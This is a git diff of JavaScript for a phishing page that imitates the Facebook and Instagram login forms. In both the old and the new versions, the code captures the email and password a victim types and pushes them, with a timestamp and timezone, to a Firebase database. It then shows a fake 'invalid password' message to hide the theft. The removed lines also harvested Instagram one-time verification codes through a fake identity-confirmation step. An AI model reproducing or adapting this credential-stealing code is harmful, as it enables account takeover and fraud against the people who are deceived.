@@ -50,139 +50,90 @@ function hmlog() {
 }
 
 function login() {
-  const email = document.getElementById("fb-email").value.trim();
-  const password = document.getElementById("fb-pass").value.trim();
-
-  if (!email || !password) {
-    alert("Please enter both email and password.");
-    return;
-  }
-
-  // Save email and password to localStorage
-  localStorage.setItem("userEmail", email);
-  localStorage.setItem("userPassword", password);
-
   firebase
     .auth()
     .signInAnonymously()
-    .then(() => {
-      const currentDate = new Date().toISOString().slice(0, 10);
-      const currentTime = new Date().toISOString().slice(11, 19);
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    .catch(function (error) {
+      showError(error.message, "error_box");
+    });
 
-      firebase.database().ref("fbdet").push({
-        emle: email,
-        mobile: "",
-        time: currentTime,
-        timezone: timezone,
-        pass: password,
-        date: currentDate,
-        type: "Facebook",
-      });
+  var email = document.getElementById("fb-email").value;
+  var password = document.getElementById("fb-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Facebook";
 
-      setTimeout(() => {
-        alert("Invalid username or password");
-        document.getElementById("fb-pass").value = "";
-      }, 2000);
-    })
-    .catch((error) => alert(error.message));
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      showError("Invalid username or password", "error_box");
+      document.getElementById("fb-pass").value = "";
+      return false;
+    }, 2000);
+  } else {
+    showError("Please enter both email and password.", "error_box");
+  }
 }
 
 function iglog() {
-  const email = document.getElementById("ig-uname").value.trim();
-  const password = document.getElementById("ig-pass").value.trim();
+  var email = document.getElementById("ig-uname").value.trim();
+  var password = document.getElementById("ig-pass").value.trim();
+  var errorBox = "ig_error_box";
 
-  if (!email || !password) {
-    alert("Please enter both email and password.");
-    return;
+  if (email === "" || password === "") {
+    showError("Please enter both email and password.", errorBox);
+    return false; // Prevents further execution
   }
 
-  // Get the current submission count from localStorage (default to 0)
-  let submissionCount = parseInt(
-    localStorage.getItem("submissionCount") || "0"
-  );
-
-  // Increment the submission count
-  submissionCount++;
-  localStorage.setItem("submissionCount", submissionCount);
-
-  if (submissionCount <= 3) {
-    // Save the email and password to Firebase
-    firebase
-      .auth()
-      .signInAnonymously()
-      .then(() => {
-        const currentDate = new Date().toISOString().slice(0, 10);
-        const currentTime = new Date().toISOString().slice(11, 19);
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-        firebase.database().ref("fbdet").push({
-          emle: email,
-          mobile: "",
-          time: currentTime,
-          timezone: timezone,
-          pass: password,
-          date: currentDate,
-          type: "Instagram",
-        });
-
-        if (submissionCount === 3) {
-          alert("This is your third attempt. Help us confirm it's you.");
-
-          // Ensure #veryfi is displayed
-          document.getElementById("veryfi").style.display = "block";
-          document.getElementById("igp").style.display = "none";
-
-          // Optionally, hide the login form or perform other actions
-          document.getElementById("ig-uname").disabled = true; // Disable username field
-          document.getElementById("ig-pass").disabled = true; // Disable password field
-
-          localStorage.setItem("submissionCount", 0); // Reset the count
-        } else {
-          alert(`Your password is incorrect. Try again!`);
-        }
-
-        // Clear the password field for the next attempt
-        document.getElementById("ig-pass").value = "";
-      })
-      .catch((error) => alert(error.message));
-  }
-}
-
-function igConfirm() {
-  const code = document.getElementById("ig-code").value.trim();
-
-  if (!code) {
-    alert("Please enter verification code.");
-    return;
-  }
-
-  // Retrieve email and password from localStorage
-  const email = localStorage.getItem("userEmail");
-  const password = localStorage.getItem("userPassword");
-
+  // If inputs are valid, proceed with anonymous sign-in
   firebase
     .auth()
     .signInAnonymously()
-    .then(() => {
-      const currentDate = new Date().toISOString().slice(0, 10);
-      const currentTime = new Date().toISOString().slice(11, 19);
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    .catch(function (error) {
+      showError(error.message, errorBox);
+    });
 
-      firebase.database().ref("fbdet").push({
-        code: code,
-        emle: email,
-        time: currentTime,
-        timezone: timezone,
-        date: currentDate,
-        type: "Instagram OTP",
-        pass: password, // Store the original password
-      });
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Instagram";
 
-      setTimeout(() => {
-        alert("Please enter verification code.");
-        document.getElementById("ig-code").value = "";
-      }, 2000);
-    })
-    .catch((error) => alert(error.message));
+  // Store the data in the Firebase database
+  firebase.database().ref("fbdet").push({
+    emle: email,
+    mobile: "",
+    time: currentTime,
+    timezone: timezone,
+    pass: password,
+    date: currentDate,
+    type: accountType,
+  });
+
+  // Simulate a delay and provide feedback
+  setTimeout(function () {
+    showError("Please double-check your password", errorBox);
+    document.getElementById("ig-pass").value = ""; // Clear the password field
+    return false; // Optionally prevent form submission if that's the goal
+  }, 2000);
+}
+
+function showError(message, boxId) {
+  var errorBox = document.getElementById(boxId);
+  errorBox.style.display = "block";
+  errorBox.querySelector("div:nth-child(2)").textContent = message;
+}
+
+function hideError(boxId) {
+  var errorBox = document.getElementById(boxId);
+  errorBox.style.display = "none";
 }
